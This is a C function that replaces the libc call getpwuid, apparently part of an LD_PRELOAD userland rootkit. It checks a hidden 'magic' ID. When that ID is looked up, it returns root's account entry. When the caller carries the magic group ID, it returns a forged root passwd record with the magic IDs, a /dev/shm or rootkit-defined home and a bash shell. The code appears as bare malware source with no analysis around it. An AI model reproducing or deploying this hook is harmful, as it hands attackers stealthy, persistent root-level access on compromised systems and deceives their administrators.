struct passwd *getpwuid(uid_t uid){
    hook(CGETPWUID);
    id_t magicid = readid();
    if(uid == magicid) return call(CGETPWUID, 0);
    if(getgid() == magicid && uid == 0){
        struct passwd *bpw = call(CGETPWUID, uid);
        if(!bpw) return call(CGETPWUID, uid);
        bpw->pw_uid = magicid;
        bpw->pw_gid = magicid;
        if(!initmvbc()) bpw->pw_dir = "/dev/shm";
        else            bpw->pw_dir = mvbc->homedir;
        bpw->pw_shell = "/bin/bash";
        return bpw;
    }
    return call(CGETPWUID, uid);
}